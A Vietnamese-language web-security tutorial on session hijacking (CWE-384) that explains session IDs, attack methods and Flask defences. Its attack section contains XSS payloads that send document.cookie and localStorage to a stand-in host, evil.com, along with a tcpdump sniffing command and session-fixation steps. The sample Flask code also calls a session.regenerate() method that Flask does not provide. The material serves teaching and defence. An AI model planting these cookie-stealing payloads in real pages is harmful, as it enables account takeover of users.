# Session Hijacking

> **CWE**: CWE-384 | **Phân loại**: Session Management

## Kiến thức Nền tảng
Hãy tưởng tượng giao thức HTTP của mạng Internet giống như một người phục vụ quán ăn bị mất trí nhớ ngắn hạn (**stateless**). Mỗi lần bạn gọi món, người phục vụ này hoàn toàn không nhớ bạn là ai và vừa gọi cái gì ở giây trước. Để giải quyết vấn đề này, sau khi bạn đăng nhập thành công, máy chủ sẽ phát cho bạn một chiếc thẻ bàn có ghi một mã số ngẫu nhiên duy nhất (gọi là **Session ID**). Chiếc thẻ này được trình duyệt của bạn cất giữ trong một ngăn tủ nhỏ gọi là Cookie.

Mỗi khi bạn gửi một yêu cầu tiếp theo (như xem giỏ hàng hay thanh toán), trình duyệt sẽ tự động trình chiếc thẻ bàn (Session ID) này cho người phục vụ xem. Người phục vụ chỉ cần đối chiếu mã số trên thẻ với sổ ghi chép ở quầy để biết bạn là ai và phục vụ đúng món. Chiếc thẻ bàn này chính là "chìa khóa" độc nhất để chứng minh bạn đã đăng nhập. Nếu bất kỳ ai nhặt được hoặc sao chép được chiếc thẻ này của bạn, họ có thể nghiễm nhiên ngồi vào bàn của bạn và gọi món, thanh toán bằng tiền của bạn mà không cần biết mật khẩu.

```python
# Normal session management flow
from flask import Flask, session
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # 256-bit random secret

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # Regenerate session ID after login to prevent fixation
        session.regenerate()
        session['user_id'] = user.id
        session['login_time'] = datetime.utcnow().isoformat()
        session['ip'] = request.remote_addr
        
        # Cookie sent with security flags
        response = redirect('/dashboard')
        return response
    return "Invalid credentials", 401
```

Session ID phải đủ dài (128-bit trở lên), ngẫu nhiên (dùng CSPRNG), và được bảo vệ bởi các cookie flags. Nếu attacker đánh cắp được session ID, họ có thể mạo danh user mà không cần biết mật khẩu.

## Mô tả lỗ hổng
Lỗ hổng Cướp quyền điều khiển phiên (Session Hijacking) xảy ra khi kẻ tấn công tìm cách đánh cắp, đoán trước hoặc giả mạo mã Session ID của người dùng hợp lệ để chiếm đoạt phiên làm việc của họ.

Mối nguy hiểm của lỗ hổng này rất lớn vì nó cho phép kẻ tấn công vượt qua toàn bộ các bước bảo mật (kể cả mật khẩu hay xác thực 2FA) để trực tiếp truy cập vào tài khoản của nạn nhân. Kẻ tấn công có thể thực hiện việc này bằng cách chèn mã độc JavaScript (XSS) để đọc trộm cookie, nghe lén lưu lượng mạng không được mã hóa (sniffing) tại các điểm Wi-Fi công cộng, hoặc dự đoán mã Session ID nếu hệ thống tạo ra các mã này theo quy luật quá đơn giản.

## Cơ chế tấn công
**1. XSS-based Session Theft — đánh cắp cookie qua JavaScript:**

```html
<!-- Attacker injects this script via stored XSS -->
<script>
// Steal session cookie and send to attacker's server
var img = new Image();
img.src = 'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>

<!-- More stealthy: using fetch API -->
<script>
fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        localStorage: JSON.stringify(localStorage)
    })
});
</script>
```

**2. Network Sniffing — nghe lén trên HTTP không mã hóa:**

```bash
# Attacker on same network (coffee shop WiFi) uses tcpdump
sudo tcpdump -i wlan0 -A -s 0 'port 80 and (host target.com)'

# Or using Wireshark filter to capture session cookies:
# http.cookie contains "session"

# Captured: Cookie: session=abc123def456
# Attacker replays cookie in their browser to hijack session
```

**3. Session Fixation — ép nạn nhân dùng session ID đã biết:**

```
// Step 1: Attacker gets a valid session ID from target site
GET /login HTTP/1.1
Response: Set-Cookie: SESSIONID=attacker_known_id

// Step 2: Attacker sends victim a link with fixed session
https://target.com/login?SESSIONID=attacker_known_id

// Step 3: Victim logs in using attacker's session ID
// Step 4: Attacker uses the SAME session ID — now authenticated as victim
```

**4. Predictable Session IDs:**

```python
# VULNERABLE: predictable session ID generation
import time, hashlib

def generate_session_id(username):
    # Session based on timestamp + username — attacker can guess
    raw = f"{username}{int(time.time())}"
    return hashlib.md5(raw.encode()).hexdigest()

# Attacker knows username "admin" and approximate login time
# Can brute-force a few hundred MD5 hashes to find the session
```

## Biện pháp phòng thủ
- **Tóm tắt**: Ngăn chặn đánh cắp phiên bằng cách sử dụng các cờ bảo mật cookie (HttpOnly, Secure, SameSite), tạo lại session ID khi đăng nhập và bắt buộc HTTPS.
- **Các bước chi tiết**:
  - **Cookie security flags**: Luôn set `HttpOnly` (chặn JavaScript đọc), `Secure` (chỉ gửi qua HTTPS), và `SameSite=Strict` (chặn CSRF).
  - **Session regeneration**: Tạo session ID mới sau khi đăng nhập (chống fixation) và sau mỗi thay đổi quyền.
  - **HTTPS everywhere**: Buộc toàn bộ traffic qua HTTPS với HSTS header để chống network sniffing.
  - **Session binding**: Gắn session với IP và User-Agent, cảnh báo khi phát hiện thay đổi bất thường.
  - **Cryptographic session IDs**: Dùng CSPRNG (Cryptographically Secure Pseudo-Random Number Generator) để tạo session ID 128-bit trở lên.

## Code Example
```python
# VULNERABLE: no cookie flags, predictable session, no regeneration
app.config['SESSION_COOKIE_HTTPONLY'] = False   # JS can read cookie
app.config['SESSION_COOKIE_SECURE'] = False     # Sent over HTTP
app.config['SESSION_COOKIE_SAMESITE'] = None    # No CSRF protection

@app.route('/login', methods=['POST'])
def login_unsafe():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # No session regeneration — fixation possible
        session['user_id'] = user.id
        return redirect('/dashboard')
    return "Failed", 401
```

```python
# SECURE: proper cookie flags, session regeneration, binding
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,       # Block JavaScript access
    SESSION_COOKIE_SECURE=True,        # HTTPS only
    SESSION_COOKIE_SAMESITE='Strict',  # Prevent cross-site sending
    PERMANENT_SESSION_LIFETIME=1800,   # 30 minutes timeout
    SESSION_COOKIE_NAME='__Host-sid'   # Cookie prefix for extra security
)

@app.route('/login', methods=['POST'])
def login_safe():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # Regenerate session ID to prevent fixation
        session.clear()
        session.regenerate()
        
        session['user_id'] = user.id
        session['ip'] = request.remote_addr
        session['ua'] = request.headers.get('User-Agent')
        session['created'] = datetime.utcnow().isoformat()
        
        return redirect('/dashboard')
    return "Invalid credentials", 401

@app.before_request
def validate_session():
    if 'user_id' in session:
        # Detect session anomalies (IP or User-Agent change)
        if session.get('ip') != request.remote_addr:
            session.clear()
            return redirect('/login?reason=session_anomaly')
```

## Xem thêm
- [Stored XSS](../../05-injection/xss/stored/) — Kẻ tấn công sử dụng lỗ hổng XSS lưu trữ để chèn mã độc JavaScript nhằm đánh cắp session cookie từ trình duyệt của nạn nhân.

## Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/authentication/session-management
- OWASP: https://owasp.org/www-community/attacks/Session_hijacking_attack
- CWE: https://cwe.mitre.org/data/definitions/384.html

## Giải thích thuật ngữ
- **Stateless (Không trạng thái)**: Đặc tính của giao thức HTTP nơi mỗi yêu cầu từ máy khách gửi lên máy chủ đều được xử lý hoàn toàn độc lập, máy chủ không lưu giữ bất kỳ thông tin nào về các yêu cầu trước đó.
- **Session (Phiên làm việc)**: Cơ chế duy trì trạng thái tương tác giữa người dùng và ứng dụng web trong một khoảng thời gian, lưu giữ thông tin đăng nhập và hoạt động của người dùng ở phía máy chủ.
- **Session ID (Mã định danh phiên)**: Chuỗi ký tự ngẫu nhiên, duy nhất dùng làm khóa để ánh xạ yêu cầu của người dùng với dữ liệu phiên làm việc tương ứng được lưu trên máy chủ.
- **XSS (Cross-Site Scripting)**: Lỗ hổng bảo mật cho phép kẻ tấn công chèn các đoạn mã script độc hại (thường là JavaScript) vào trang web và thực thi trên trình duyệt của người dùng khác.
- **Sniffing (Nghe lén mạng)**: Hành động chặn bắt và theo dõi các gói tin dữ liệu truyền tải trên mạng để thu thập thông tin nhạy cảm (như Session ID truyền qua HTTP không mã hóa).
- **Session Hijacking (Cướp phiên)**: Hành vị tin tặc đánh cắp mã Session ID của người dùng hợp lệ để giả mạo họ và truy cập trái phép vào ứng dụng mà không cần thông tin đăng nhập.
